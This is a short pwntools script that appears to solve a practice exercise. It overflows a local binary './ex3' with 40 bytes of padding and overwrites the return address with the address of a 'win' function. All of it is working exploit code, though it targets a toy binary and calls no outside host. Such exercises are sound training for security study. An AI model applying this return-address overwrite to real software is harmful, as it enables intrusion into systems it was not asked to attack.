from pwn import *

# Start the vulnerable program
p = process('./ex3')  # Replace with the actual compiled binary name

# The address of the win function
win_address = 0x0000000000001169  # Address from the disassembly

# Create the payload
padding = b'A' * 40  # 40 bytes to reach the return address
payload = padding + p64(win_address)  # Append the win function address (64-bit)

# Send the payload
p.sendline(payload)

# Interact with the process to see the output
p.interactive()
